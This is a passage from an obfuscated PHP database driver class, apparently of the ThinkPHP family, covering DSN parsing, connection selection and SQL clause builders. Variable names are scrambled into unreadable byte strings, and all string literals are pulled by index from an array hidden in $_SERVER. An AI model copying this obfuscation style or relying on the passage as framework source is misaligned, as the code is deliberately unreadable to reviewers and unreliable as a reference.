is_string($B…Öø¡Ôö)) { $B…Öø¡Ôö = $this->parseDSN($B…Öø¡Ôö); } elseif (is_array($B…Öø¡Ôö)) { $B…Öø¡Ôö = array_change_key_case($B…Öø¡Ôö); $B…Öø¡Ôö = array($CÂ¼‚©ø”ò[862] => $B…Öø¡Ôö[$CÂ¼‚©ø”ò[712]], $CÂ¼‚©ø”ò[790] => $B…Öø¡Ôö[$CÂ¼‚©ø”ò[867]], $CÂ¼‚©ø”ò[791] => $B…Öø¡Ôö[$CÂ¼‚©ø”ò[868]], $CÂ¼‚©ø”ò[788] => $B…Öø¡Ôö[$CÂ¼‚©ø”ò[869]], $CÂ¼‚©ø”ò[789] => $B…Öø¡Ôö[$CÂ¼‚©ø”ò[870]], $CÂ¼‚©ø”ò[27] => $B…Öø¡Ôö[$CÂ¼‚©ø”ò[871]], $CÂ¼‚©ø”ò[817] => $B…Öø¡Ôö[$CÂ¼‚©ø”ò[714]], $CÂ¼‚©ø”ò[23] => isset($B…Öø¡Ôö[$CÂ¼‚©ø”ò[872]]) ? $B…Öø¡Ôö[$CÂ¼‚©ø”ò[872]] : array()); } elseif (empty($B…Öø¡Ôö)) { if (think_config($CÂ¼‚©ø”ò[873]) && $CÂ¼‚©ø”ò[713] != strtolower(think_config($CÂ¼‚©ø”ò[874]))) { $B…Öø¡Ôö = $this->parseDSN(think_config($CÂ¼‚©ø”ò[873])); } else { $B…Öø¡Ôö = array($CÂ¼‚©ø”ò[862] => think_config($CÂ¼‚©ø”ò[874]), $CÂ¼‚©ø”ò[790] => think_config($CÂ¼‚©ø”ò[875]), $CÂ¼‚©ø”ò[791] => think_config($CÂ¼‚©ø”ò[876]), $CÂ¼‚©ø”ò[788] => think_config($CÂ¼‚©ø”ò[877]), $CÂ¼‚©ø”ò[789] => think_config($CÂ¼‚©ø”ò[878]), $CÂ¼‚©ø”ò[27] => think_config($CÂ¼‚©ø”ò[247]), $CÂ¼‚©ø”ò[817] => think_config($CÂ¼‚©ø”ò[873]), $CÂ¼‚©ø”ò[23] => think_config($CÂ¼‚©ø”ò[879])); } } return $B…Öø¡Ôö; } protected function initConnect($BíÉ—áÖèå = true) { if (1 == think_config($_SERVER[¨¤¼…´][28])) { $this->_linkID = $this->multiConnect($BíÉ—áÖèå); } else { if (!$this->connected) { $this->_linkID = $this->connect(); } } } protected function multiConnect($béªáÂíãõ = false) { $fëÃŞ‚Ããç =& $_SERVER[¨¤¼…´]; static $a¦Ü âªÙ = array(); if (empty($a¦Ü âªÙ)) { foreach ($this->config as $B¶ÃìÃë¯ => $DŠ¡Ñ¯¶†¡) { $a¦Ü âªÙ[$B¶ÃìÃë¯] = explode($fëÃŞ‚Ããç[57], $DŠ¡Ñ¯¶†¡); } } if (think_config($fëÃŞ‚Ããç[880])) { if ($béªáÂíãõ) { $a¨ ¾¤Ìõò = floor(mt_rand(0, think_config($fëÃŞ‚Ããç[881]) - 1)); } else { if (is_numeric(think_config($fëÃŞ‚Ããç[882]))) { $a¨ ¾¤Ìõò = think_config($fëÃŞ‚Ããç[882]); } else { $a¨ ¾¤Ìõò = floor(mt_rand(think_config($fëÃŞ‚Ããç[881]), count($a¦Ü âªÙ[$fëÃŞ‚Ããç[788]]) - 1)); } } } else { $a¨ ¾¤Ìõò = floor(mt_rand(0, count($a¦Ü âªÙ[$fëÃŞ‚Ããç[788]]) - 1)); } $e°—ğÀ–Ô¶ = array($fëÃŞ‚Ããç[790] => isset($a¦Ü âªÙ[$fëÃŞ‚Ããç[790]][$a¨ ¾¤Ìõò]) ? $a¦Ü âªÙ[$fëÃŞ‚Ããç[790]][$a¨ ¾¤Ìõò] : $a¦Ü âªÙ[$fëÃŞ‚Ããç[790]][0], $fëÃŞ‚Ããç[791] => isset($a¦Ü âªÙ[$fëÃŞ‚Ããç[791]][$a¨ ¾¤Ìõò]) ? $a¦Ü âªÙ[$fëÃŞ‚Ããç[791]][$a¨ ¾¤Ìõò] : $a¦Ü âªÙ[$fëÃŞ‚Ããç[791]][0], $fëÃŞ‚Ããç[788] => isset($a¦Ü âªÙ[$fëÃŞ‚Ããç[788]][$a¨ ¾¤Ìõò]) ? $a¦Ü âªÙ[$fëÃŞ‚Ããç[788]][$a¨ ¾¤Ìõò] : $a¦Ü âªÙ[$fëÃŞ‚Ããç[788]][0], $fëÃŞ‚Ããç[789] => isset($a¦Ü âªÙ[$fëÃŞ‚Ããç[789]][$a¨ ¾¤Ìõò]) ? $a¦Ü âªÙ[$fëÃŞ‚Ããç[789]][$a¨ ¾¤Ìõò] : $a¦Ü âªÙ[$fëÃŞ‚Ããç[789]][0], $fëÃŞ‚Ããç[27] => isset($a¦Ü âªÙ[$fëÃŞ‚Ããç[27]][$a¨ ¾¤Ìõò]) ? $a¦Ü âªÙ[$fëÃŞ‚Ããç[27]][$a¨ ¾¤Ìõò] : $a¦Ü âªÙ[$fëÃŞ‚Ããç[27]][0], $fëÃŞ‚Ããç[817] => isset($a¦Ü âªÙ[$fëÃŞ‚Ããç[817]][$a¨ ¾¤Ìõò]) ? $a¦Ü âªÙ[$fëÃŞ‚Ããç[817]][$a¨ ¾¤Ìõò] : $a¦Ü âªÙ[$fëÃŞ‚Ããç[817]][0], $fëÃŞ‚Ããç[23] => isset($a¦Ü âªÙ[$fëÃŞ‚Ããç[23]][$a¨ ¾¤Ìõò]) ? $a¦Ü âªÙ[$fëÃŞ‚Ããç[23]][$a¨ ¾¤Ìõò] : $a¦Ü âªÙ[$fëÃŞ‚Ããç[23]][0]); return $this->connect($e°—ğÀ–Ô¶, $a¨ ¾¤Ìõò); } public function parseDSN($c‰°Äº—¼º) { $Cñ½…‘—Àñ =& $_SERVER[¨¤¼…´]; if (empty($c‰°Äº—¼º)) { return !1; } $AÁ¸¼ğÛÉÎ = parse_url($c‰°Äº—¼º); if ($AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[182]]) { $D¯ÛÖ™ÚßÈ = array($Cñ½…‘—Àñ[862] => $AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[182]], $Cñ½…‘—Àñ[790] => isset($AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[547]]) ? $AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[547]] : $Cñ½…‘—Àñ[43], $Cñ½…‘—Àñ[791] => isset($AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[883]]) ? $AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[883]] : $Cñ½…‘—Àñ[43], $Cñ½…‘—Àñ[788] => isset($AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[183]]) ? $AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[183]] : $Cñ½…‘—Àñ[43], $Cñ½…‘—Àñ[789] => isset($AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[184]]) ? $AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[184]] : $Cñ½…‘—Àñ[43], $Cñ½…‘—Àñ[27] => isset($AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[85]]) ? substr($AÁ¸¼ğÛÉÎ[$Cñ½…‘—Àñ[85]], 1) : $Cñ½…‘—Àñ[43]); } else { preg_match($Cñ½…‘—Àñ[884], trim($c‰°Äº—¼º), $EºäÚº—£ƒ); $D¯ÛÖ™ÚßÈ = array($Cñ½…‘—Àñ[862] => $EºäÚº—£ƒ[1], $Cñ½…‘—Àñ[790] => $EºäÚº—£ƒ[2], $Cñ½…‘—Àñ[791] => $EºäÚº—£ƒ[3], $Cñ½…‘—Àñ[788] => $EºäÚº—£ƒ[4], $Cñ½…‘—Àñ[789] => $EºäÚº—£ƒ[5], $Cñ½…‘—Àñ[27] => $EºäÚº—£ƒ[6]); } $D¯ÛÖ™ÚßÈ[$Cñ½…‘—Àñ[817]] = $Cñ½…‘—Àñ[43]; return $D¯ÛÖ™ÚßÈ; } protected function debug() { $EÙ˜á¤ÙÃ¹ =& $_SERVER[¨¤¼…´]; $this->modelSql[$this->model] = $this->queryStr; $this->model = $EÙ˜á¤ÙÃ¹[885]; if (think_config($EÙ˜á¤ÙÃ¹[886])) { think_status($EÙ˜á¤ÙÃ¹[887]); think_trace($this->queryStr . $EÙ˜á¤ÙÃ¹[888] . think_status($EÙ˜á¤ÙÃ¹[30], $EÙ˜á¤ÙÃ¹[887], 6) . $EÙ˜á¤ÙÃ¹[889], $EÙ˜á¤ÙÃ¹[43], $EÙ˜á¤ÙÃ¹[890]); } } protected function parseLock($dñµöùÚºØ = false) { $C¨¬¤×Åéİ =& $_SERVER[¨¤¼…´]; if (!$dñµöùÚºØ) { return $C¨¬¤×Åéİ[43]; } if ($C¨¬¤×Åéİ[819] == $this->dbType) { return $C¨¬¤×Åéİ[891]; } return $C¨¬¤×Åéİ[892]; } protected function parseSet($FŒŸÏâ§ºŸ) { $bÔœéÍãÀ =& $_SERVER[¨¤¼…´]; foreach ($FŒŸÏâ§ºŸ as $d—Å–‡…Ú¦ => $f•Òõ‚£åö) { if (is_array($f•Òõ‚£åö) && $bÔœéÍãÀ[298] == $f•Òõ‚£åö[0]) { $D¹³´‘÷œ¢[] = $this->parseKey($d—Å–‡…Ú¦) . $bÔœéÍãÀ[893] . $f•Òõ‚£åö[1]; } elseif (is_scalar($f•Òõ‚£åö) || is_null($f•Òõ‚£åö)) { $D¹³´‘÷œ¢[] = $this->parseKey($d—Å–‡…Ú¦) . $bÔœéÍãÀ[893] . $this->parseValue($f•Òõ‚£åö); } } return $bÔœéÍãÀ[894] . implode($bÔœéÍãÀ[57], $D¹³´‘÷œ¢); } protected function bindParam($cÜ‚àäÑƒñ, $f¯ÊŞ«Å¾) { $this->bind[$_SERVER[¨¤¼…´][4] . $cÜ‚àäÑƒñ] = $f¯ÊŞ«Å¾; } protected function parseBind($aù¯³¢¸µ„) { $aù¯³¢¸µ„ = array_merge($this->bind, $aù¯³¢¸µ„); $this->bind = array(); return $aù¯³¢¸µ„; } function parseKey(&$F´ÓØ‹é¬Æ, $FÂˆ³™àÁ = true) { if ($FÂˆ³™àÁ) { $F´ÓØ‹é¬Æ = $this->parseKeyCheck($F´ÓØ‹é¬Æ); } return $F´ÓØ‹é¬Æ; } function parseKeyCheck($eæ­½‹‚Í–) { $fØóê»àÄò =& $_SERVER[¨¤¼…´]; $eæ­½‹‚Í– = trim($eæ­½‹‚Í–); if (!preg_match($fØóê»àÄò[895], $eæ­½‹‚Í–)) { think_exception($fØóê»àÄò[896] . $eæ­½‹‚Í–); } return $eæ­½‹‚Í–; } protected function parseValue($Cè¶íĞ¼Ä¿) { $CÙ‘œ¹³Œ =& $_SERVER[¨¤¼…´]; if (is_string($Cè¶íĞ¼Ä¿)) { $Cè¶íĞ¼Ä¿ = $CÙ‘œ¹³Œ[858] . $this->escapeString($Cè¶íĞ¼Ä¿) . $CÙ‘œ¹³Œ[858]; } elseif (isset($Cè¶íĞ¼Ä¿[0]) && is_string($Cè¶íĞ¼Ä¿[0]) && strtolower($Cè¶íĞ¼Ä¿[0]) == $CÙ‘œ¹³Œ[298]) { $Cè¶íĞ¼Ä¿ = $this->escapeString($Cè¶íĞ¼Ä¿[1]); } elseif (is_array($Cè¶íĞ¼Ä¿)) { $Cè¶íĞ¼Ä¿ = array_map(array($this, $CÙ‘œ¹³Œ[859]), $Cè¶íĞ¼Ä¿); } elseif (is_bool($Cè¶íĞ¼Ä¿)) { $Cè¶íĞ¼Ä¿ = $Cè¶íĞ¼Ä¿ ? $CÙ‘œ¹³Œ[93] : $CÙ‘œ¹³Œ[481]; } elseif (is_null($Cè¶íĞ¼Ä¿)) { $Cè¶íĞ¼Ä¿ = $CÙ‘œ¹³Œ[109]; } return $Cè¶íĞ¼Ä¿; } protected function parseField($FéÆÀÏ¨) { $aë‘„×“¹ =& $_SERVER[¨¤¼…´]; if (is_string($FéÆÀÏ¨) && strpos($FéÆÀÏ¨, $aë‘„×“¹[57])) { $FéÆÀÏ¨ = explode($aë‘„×“¹[57], $FéÆÀÏ¨); } if (is_array($FéÆÀÏ¨)) { $DáŠÒˆ½ë = array(); foreach ($FéÆÀÏ¨ as $E²Ô¬¡â¥Õ => $CÅÛª¶ÎÖ) { if (!is_numeric($E²Ô¬¡â¥Õ)) { $DáŠÒˆ½ë[] = $this->parseKey($E²Ô¬¡â¥Õ) . $aë‘„×“¹[897] . $this->parseKey($CÅÛª¶ÎÖ); } else { $DáŠÒˆ½ë[] = $this->parseKey($CÅÛª¶ÎÖ); } } $dŒ‚ÓÇ›óÎ = implode($aë‘„×“¹[57], $DáŠÒˆ½ë); } elseif (is_string($FéÆÀÏ¨) && !empty($FéÆÀÏ¨)) { $dŒ‚ÓÇ›óÎ = $FéÆÀÏ¨; } else { $dŒ‚ÓÇ›óÎ = $aë‘„×“¹[190]; } return $dŒ‚ÓÇ›óÎ; } protected function parseTable($e‹œÀ¯¶§) { $F„ÉÇ¹Áµè =& $_SERVER[¨¤¼…´]; if (is_array($e‹œÀ¯¶§)) { $eÂìè‡ŞÆ­ = array(); foreach ($e‹œÀ¯¶§ as $cÀ±¾‹ËŸ => $EˆÊåŠ¯ó°) { if (!is_numeric($cÀ±¾‹ËŸ)) { $eÂìè‡ŞÆ­[] = $this->parseKey($cÀ±¾‹ËŸ) . $F„ÉÇ¹Áµè[60] . $this->parseKey($EˆÊåŠ¯ó°); } else { $eÂìè‡ŞÆ­[] = $this->parseKey($cÀ±¾‹ËŸ); } } $e‹œÀ¯¶§ = $eÂìè‡ŞÆ­; } elseif (is_string($e‹œÀ¯¶§)) { if (strstr($e‹œÀ¯¶§, $F„ÉÇ¹Áµè[60])) { return $e‹œÀ¯¶§; } $e‹œÀ¯¶§ = explode($F„ÉÇ¹Áµè[57], $e‹œÀ¯¶§); array_walk($e‹œÀ¯¶§, array($this, $F„ÉÇ¹Áµè[807])); } return $F„ÉÇ¹Áµè[898] . trim(implode($F„ÉÇ¹Áµè[899], $e‹œÀ¯¶§), $F„ÉÇ¹Áµè[813]) . $F„ÉÇ¹Áµè[898]; } protected function parseWhere($F©¨­¦ñ’Ë) { $B¾ŠÙ„…­– =& $_SERVER[¨¤¼…´]; $Eà»ãê¬Ãğ = $B¾ŠÙ„…­–[43]; if (is_string($F©¨­¦ñ’Ë)) { $Eà»ãê¬Ãğ = $F©¨­¦ñ’Ë; } else { $D¥ÚÓ–µƒ· = isset($F©¨­¦ñ’Ë[$B¾ŠÙ„…­–[900]]) ? strtoupper($F©¨­¦ñ’Ë[$B¾ŠÙ„…­–[900]]) : $B¾ŠÙ„…­–[43]; if (in_array($D¥ÚÓ–µƒ·, array($B¾ŠÙ„…­–[901], $B¾ŠÙ„…­–[902], $B¾ŠÙ„…­–[903]))) { $D¥ÚÓ–µƒ· = $B¾ŠÙ„…­–[60] . $D¥ÚÓ–µƒ· . $B¾ŠÙ„…­–[60]; unset($F©¨­¦ñ’Ë[$B¾ŠÙ„…­–[900]]); } else { $D¥ÚÓ–µƒ· = $B¾ŠÙ„…­–[904]; } foreach ($F©¨­¦ñ’Ë as $B®ŸÑ‰ÃÔ => $cÀË÷Œ›Ş¿) { $Eà»ãê¬Ãğ .= $B¾ŠÙ„…­–[278]; if (is_numeric($B®ŸÑ‰ÃÔ)) { $B®ŸÑ‰ÃÔ = $B¾ŠÙ„…­–[905]; } if (0 === strpos($B®ŸÑ‰ÃÔ, $B¾ŠÙ„…­–[80])) { $Eà»ãê¬Ãğ .= $this->parseThinkWhere($B®ŸÑ‰ÃÔ, $cÀË÷Œ›Ş¿); } else { if (!preg_match($B¾ŠÙ„…­–[906], trim($B®ŸÑ‰ÃÔ))) { think_exception(think_lang($B¾ŠÙ„…­–[907]) . $B¾ŠÙ„…­–[4] . $B®ŸÑ‰ÃÔ); } $aôà—ˆÙ÷ˆ = is_array($cÀË÷Œ›Ş¿) && isset($cÀË÷Œ›Ş¿[$B¾ŠÙ„…­–[908]]); $B®ŸÑ‰ÃÔ = trim($B®ŸÑ‰ÃÔ); if (strpos($B®ŸÑ‰ÃÔ, $B¾ŠÙ„…­–[284])) { $EŸíÔÃÀ® = explode($B¾ŠÙ„…­–[284], $B®ŸÑ‰ÃÔ); $E¦ÍÚëäˆ = array(); foreach ($EŸíÔÃÀ® as $e­ù«©å => $E©ÖìùÏç) { $Dä¾ËåÅÇá = $aôà—ˆÙ÷ˆ ? $cÀË÷Œ›Ş¿[$e­ù«©å] : $cÀË÷Œ›Ş¿; $E¦ÍÚëäˆ[] = $B¾ŠÙ„…­–[261] . $this->parseWhereItem($this->parseKey($E©ÖìùÏç), $Dä¾ËåÅÇá) . $B¾ŠÙ„…­–[806]; } $Eà»ãê¬Ãğ .= implode($B¾ŠÙ„…­–[909], $E¦ÍÚëäˆ); } elseif (strpos($B®ŸÑ‰ÃÔ, $B¾ŠÙ„…­–[285])) { $EŸíÔÃÀ® = explode($B¾ŠÙ„…­–[285], $B®ŸÑ‰ÃÔ); $E¦ÍÚëäˆ = array(); foreach ($EŸíÔÃÀ® as $e­ù«©å => $E©ÖìùÏç) { $Dä¾ËåÅÇá = $aôà—ˆÙ÷ˆ ? $cÀË÷Œ›Ş¿[$e­ù«©å] : $cÀË÷Œ›Ş¿; $E¦ÍÚëäˆ[] = $B¾ŠÙ„…­–[261] . $this->parseWhereItem($this->parseKey($E©ÖìùÏç), $Dä¾ËåÅÇá) . $B¾ŠÙ„…­–[806]; } $Eà»ãê¬Ãğ .= implode($B¾ŠÙ„…­–[904], $E¦ÍÚëäˆ); } else { $Eà»ãê¬Ãğ .= $this->parseWhereItem($this->parseKey($B®ŸÑ‰ÃÔ), $cÀË÷Œ›Ş¿); } } $Eà»ãê¬Ãğ .= $B¾ŠÙ„…­–[279] . $D¥ÚÓ–µƒ·; } $Eà»ãê¬Ãğ = substr($Eà»ãê¬Ãğ, 0, -strlen($D¥ÚÓ–µƒ·)); } return empty($Eà»ãê¬Ãğ) ? $B¾ŠÙ„…­–[43] : $B¾ŠÙ„…­–[910] . $Eà»ãê¬Ãğ; } protected function parseWhereItem($cÂçôßèç, $fÔï™ªá’) { $FİÈ—‰‡° =& $_SERVER[¨¤¼…´]; $dğĞ¥¤Ôà£ = $FİÈ—‰‡°[43]; if (is_array($fÔï™ªá’)) { if (is_string($fÔï™ªá’[0])) { $D‰Æ§Ç—òë = strtolower($fÔï™ªá’[0]); if (in_array($fÔï™ªá’[0], array($FİÈ—‰‡°[893], $FİÈ—‰‡°[911], $FİÈ—‰‡°[912], $FİÈ—‰‡°[913], $FİÈ—‰‡°[914], $FİÈ—‰‡°[915]))) { $dğĞ¥¤Ôà£ .= $cÂçôßèç . $FİÈ—‰‡°[60] . $fÔï™ªá’[0] . $FİÈ—‰‡°[60] . $this->parseValue($fÔï™ªá’[1]); } elseif (preg_match($FİÈ—‰‡°[916], $fÔï™ªá’[0])) { $dğĞ¥¤Ôà£ .= $cÂçôßèç . $FİÈ—‰‡°[60] . $this->exp[$D‰Æ§Ç—òë] . $FİÈ—‰‡°[60] . $this->parseValue($fÔï™ªá’[1]); } elseif (preg_match($FİÈ—‰‡°[917], $fÔï™ªá’[0])) { if (is_array($fÔï™ªá’[1])) { $bÇŠ•ğîÓº = isset($fÔï™ªá’[2]) ? strtoupper($fÔï™ªá’[2]) : $FİÈ—‰‡°[902]; if (in_array($bÇŠ•ğîÓº, array($FİÈ—‰‡°[901], $FİÈ—‰‡°[902], $FİÈ—‰‡°[903]))) { $Dá¤ˆ³ä†ó = array(); foreach ($fÔï™ªá’[1] as $a­ÙÍ•Š…‹) { $Dá¤ˆ³ä†ó[] = $cÂçôßèç . $FİÈ—‰‡°[60] . $this->exp[$D‰Æ§Ç—òë] . $FİÈ—‰‡°[60] . $this->parseValue($a­ÙÍ•Š…‹); } $dğĞ¥¤Ôà£ .= $FİÈ—‰‡°[261] . implode($FİÈ—‰‡°[60] . $bÇŠ•ğîÓº . $FİÈ—‰‡°[60], $Dá¤ˆ³ä†ó) . $FİÈ—‰‡°[806]; } } else { $dğĞ¥¤Ôà£ .= $cÂçôßèç . $FİÈ—‰‡°[60] . $this->exp[$D‰Æ§Ç—òë] . $FİÈ—‰‡°[60] . $this->parseValue($fÔï™ªá’[1]); } } elseif ($FİÈ—‰‡°[298] == $D‰Æ§Ç—òë) { $dğĞ¥¤Ôà£ .= $FİÈ—‰‡°[804] . $cÂçôßèç . $FİÈ—‰‡°[60] . $fÔï™ªá’[1] . $FİÈ—‰‡°[918]; } elseif (preg_match($FİÈ—‰‡°[919], $fÔï™ªá’[0])) { if (isset($fÔï™ªá’[2]) && $FİÈ—‰‡°[298] == $fÔï™ªá’[2]) { $dğĞ¥¤Ôà£ .= $cÂçôßèç . $FİÈ—‰‡°[60] . $this->exp[$D‰Æ§Ç—òë] . $FİÈ—‰‡°[60] . $fÔï™ªá’[1]; } else { if (is_string($fÔï™ªá’[1])) { $fÔï™ªá’[1] = explode($FİÈ—‰‡°[57], $fÔï™ªá’[1]); } $eäùË•œ¤ = implode($FİÈ—‰‡°[57], $this->parseValue($fÔï™ªá’[1])); $dğĞ¥¤Ôà£ .= $cÂçôßèç . $FİÈ—‰‡°[60] . $this->exp[$D‰Æ§Ç—òë] . $FİÈ—‰‡°[804] . $eäùË•œ¤ . $FİÈ—‰‡°[806]; } } elseif (preg_match($FİÈ—‰‡°[920], $fÔï™ªá’[0])) { $CºË†ã‡Ê = is_string($fÔï™ªá’[1]) ? explode($FİÈ—‰‡°[57], $fÔï™ªá’[1]) : $fÔï™ªá’[1]; $dğĞ¥¤Ôà£ .= $FİÈ—‰‡°[804] . $cÂçôßèç . $FİÈ—‰‡°[60] . $this->exp[$D‰Æ§Ç—òë] . $FİÈ—‰‡°[60] . $this->parseValue($CºË†ã‡Ê[0]) . $FİÈ—‰‡°[904] . $this->parseValue($CºË†ã‡Ê[1]) . $FİÈ—‰‡°[279]; } else { think_exception(think_lang($FİÈ—‰‡°[907]) . $FİÈ—‰‡°[4] . $fÔï™ªá’[0]); } } else { $d– ŠéèÚ = count($fÔï™ªá’); $A“Ù°‡Œöë = isset($fÔï™ªá’[$d– ŠéèÚ - 1]) ? strtoupper($fÔï™ªá’[$d– ŠéèÚ - 1]) : $FİÈ—‰‡°[43]; if (in_array($A“Ù°‡Œöë, array($FİÈ—‰‡°[901], $FİÈ—‰‡°[902], $FİÈ—‰‡°[903]))) { $d– ŠéèÚ = $d– ŠéèÚ - 1; } else { $A“Ù°‡Œöë = $FİÈ—‰‡°[901]; } for ($a™ä¢Ã¹·¹ = 0; $a™ä¢Ã¹·¹ < $d– ŠéèÚ; $a™ä¢Ã¹·¹++) { $CºË†ã‡Ê = is_array($fÔï™ªá’[$a™ä¢Ã¹·¹]) ? $fÔï™ªá’[$a™ä¢Ã¹·¹][1] : $fÔï™ªá’[$a™ä¢Ã¹·¹]; if ($FİÈ—‰‡°[298] == strtolower($fÔï™ªá’[$a™ä¢Ã¹·¹][0])) { $dğĞ¥¤Ôà£ .= $FİÈ—‰‡°[261] . $cÂçôßèç . $FİÈ—‰‡°[60] . $CºË†ã‡Ê . $FİÈ—‰‡°[918] . $A“Ù°‡Œöë . $FİÈ—‰‡°[60]; } else { $c Ø›‹÷ = is_array($fÔï™ªá’[$a™ä¢Ã¹·¹]) ? $this->exp[strtolower($fÔï™ªá’[$a™ä¢Ã¹·¹][0])] : $FİÈ—‰‡°[893]; if (!$c Ø›‹÷ && is_array($fÔï™ªá’[$a™ä¢Ã¹·¹]) && in_array($fÔï™ªá’[$a™ä¢Ã¹·¹][0], array($FİÈ—‰‡°[893], $FİÈ—‰‡°[911], $FİÈ—‰‡°[912], $FİÈ—‰‡°[913], $FİÈ—‰‡°[914], $FİÈ—‰‡°[915]))) { $c Ø›‹÷ = $fÔï™ªá’[$a™ä¢Ã¹·¹][0]; } $dğĞ¥¤Ôà£ .= $FİÈ—‰‡°[261] . $cÂçôßèç . $FİÈ—‰‡°[60] . $c Ø›‹÷ . $FİÈ—‰‡°[60] . $this->parseValue($CºË†ã‡Ê) . $FİÈ—‰‡°[918] . $A“Ù°‡Œöë . $FİÈ—‰‡°[60]; } } $dğĞ¥¤Ôà£ = substr($dğĞ¥¤Ôà£, 0, -4); } } else { $dğĞ¥¤Ôà£ .= $cÂçôßèç . $FİÈ—‰‡°[921] . $this->parseValue($fÔï™ªá’); } return $dğĞ¥¤Ôà£; } protected function parseThinkWhere($F¼ÆŒğ‘Ç§, $BƒÙ¤¢±â¥) { $B¯„ƒ×œ¾å =& $_SERVER[¨¤¼…´]; $aÕÉã“§Ÿ£ = $B¯„ƒ×œ¾å[43]; switch ($F¼ÆŒğ‘Ç§) { case $B¯„ƒ×œ¾å[352]: $aÕÉã“§Ÿ£ = $BƒÙ¤¢±â¥; break; case $B¯„ƒ×œ¾å[905]: $aÕÉã“§Ÿ£ = is_string($BƒÙ¤¢±â¥) ? $BƒÙ¤¢±â¥ : substr($this->parseWhere($BƒÙ¤¢±â¥), 6); break; case $B¯„ƒ×œ¾å[922]: parse_str($BƒÙ¤¢±â¥, $bÚÔÍêØî); if (isset($bÚÔÍêØî[$B¯„ƒ×œ¾å[900]])) { $EÔÕİ¾” = $B¯„ƒ×œ¾å[60] . strtoupper($bÚÔÍêØî[$B¯„ƒ×œ¾å[900]]) . $B¯„ƒ×œ¾å[60]; unset($bÚÔÍêØî[$B¯„ƒ×œ¾å[900]]); } else { $EÔÕİ¾” = $B¯„ƒ×œ¾å[904]; } $a‚ãù¡»“ = array(); foreach ($bÚÔÍêØî as $F™’šƒË‡— => $EƒÃÆè¶˜”) { $a‚ãù¡»“[] = $this->parseKey($F™’šƒË‡—) . $B¯„ƒ×œ¾å[921] . $this->parseValue($EƒÃÆè¶˜”); } $aÕÉã“§Ÿ£ = implode($EÔÕİ¾”, $a‚ãù¡»“); break; } return $aÕÉã“§Ÿ£; } protected function parseLimit($Cµ¾Å«©Í) { $Aœ†ù§¶Ç =& $_SERVER[¨¤¼…´]; return !empty($Cµ¾Å«©Í) ? $Aœ†ù§¶Ç[58] . $Cµ¾Å«©Í . $Aœ†ù§¶Ç[60] : $Aœ†ù§¶Ç[43]; } protected function parseJoin($b×ÒÑ³ƒ‚Í) { $Eš¨‡Šºöö =& $_SERVER[¨¤¼…´]; $Fƒµ¶š‹æ¹ = $Eš¨‡Šºöö[43]; if (!empty($b×ÒÑ³ƒ‚Í)) { if (is_array($b×ÒÑ³ƒ‚Í)) { foreach ($b×ÒÑ³ƒ‚Í as $B‹´ó®‰ãğ => $E§Ëä³‰‘’) { if (!1 !== stripos($E§Ëä³‰‘’, $Eš¨‡Šºöö[923])) { $Fƒµ¶š‹æ¹ .= $Eš¨‡Šºöö[60] . $E§Ëä³‰‘’; } else { $Fƒµ¶š‹æ¹ .= $Eš¨‡Šºöö[924] . $E§Ëä³‰‘’; } } } else { $Fƒµ¶š‹æ¹ .= $Eš¨‡Šºöö[924] . $b×ÒÑ³ƒ‚Í; } } $Fƒµ¶š‹æ¹ = preg_replace($Eš¨‡Šºöö[925], think_config($Eš¨‡Šºöö[831]) . $Eš¨‡Šºöö[926], $Fƒµ¶š‹æ¹); return $Fƒµ¶š‹æ¹; } protected function parseOrder($cğÊÁŒ¿Äš) { $d°º®µÜÄ =& $_SERVER[¨¤¼…´]; if (is_array($cğÊÁŒ¿Äš)) { $a™Š·Æøóğ = array(); foreach ($cğÊÁŒ¿Äš as $aÌ¤¨Åçï¯ => $Aó÷œ×ƒõË) { if (is_numeric($aÌ¤¨Åçï¯)) { $a™Š·Æøóğ[] = $this->parseKey($Aó÷œ×ƒõË); } else { $Aó÷œ×ƒõË = in_array(strtoupper(trim($Aó÷œ×ƒõË)), array($d°º®µÜÄ[927], $d°º®µÜÄ[928])) ? $d°º®µÜÄ[60] . $Aó÷œ×ƒõË : $d°º®µÜÄ[43]; if (preg_match($d°º®µÜÄ[929], $aÌ¤¨Åçï¯)) { $a™Š·Æøóğ[] = $this->parseKey($aÌ¤¨Åçï¯) . $Aó÷œ×ƒõË; } else { think_exception($d°º®µÜÄ[930] . $aÌ¤¨Åçï¯); } } } $cğÊÁŒ¿Äš = implode($d°º®µÜÄ[57], $a™Š·Æøóğ); } return !empty($cğÊÁŒ¿Äš) ? $d°º®µÜÄ[931] . $cğÊÁŒ¿Äš : $d°º®µÜÄ[43]; } protected function parseGroup($DĞæÃÒêğ½) { $DªÚæ¼À©… =& $_SERVER[¨¤¼…´]; return !empty($DĞæÃÒêğ½) ? $DªÚæ¼À©…[932] . $DĞæÃÒêğ½ : $DªÚæ¼À©…[43]; } protected function parseHaving($DÕĞ†…Šº¯) { $D„¶´·’¤ =& $_SERVER[¨¤¼…´]; return !empty($DÕĞ†…Šº¯) ? $D„¶´·’¤[933] . $DÕĞ†…Šº¯ : $D„¶´·’¤[43]; } protected function parseComment($A’¢‘˜è¹Û) { $EË¶äÕ¸Éà =& $_SERVER[¨¤¼…´]; return !empty($A’¢‘˜è¹Û) ? $EË¶äÕ¸Éà[934] . $A’¢‘˜è¹Û . $EË¶äÕ¸Éà[935] : $EË¶äÕ¸Éà[43]; } protected function parseDistinct($bÎØğ¶ƒ¬š) { $b«Ÿˆùí· =& $_SERVER[¨¤¼…´]; return !empty($bÎØğ¶ƒ¬š) ? $b«Ÿˆùí·[936] : $b«Ÿˆùí·[43]; } protected function parseUnion($cÏŠŸ¾Â’») { $aÇ±£˜©Ö =& $_SERVER[¨¤¼…´]; if (empty($cÏŠŸ¾Â’»)) { return $aÇ±£˜©Ö[43]; } if (isset($cÏŠŸ¾Â’»[$aÇ±£˜©Ö[349]])) { $fˆà×ŠĞ‚ = $aÇ±£˜©Ö[937]; unset($cÏŠŸ¾Â’»[$aÇ±£˜©Ö[349]]); } else { $fˆà×ŠĞ‚ = 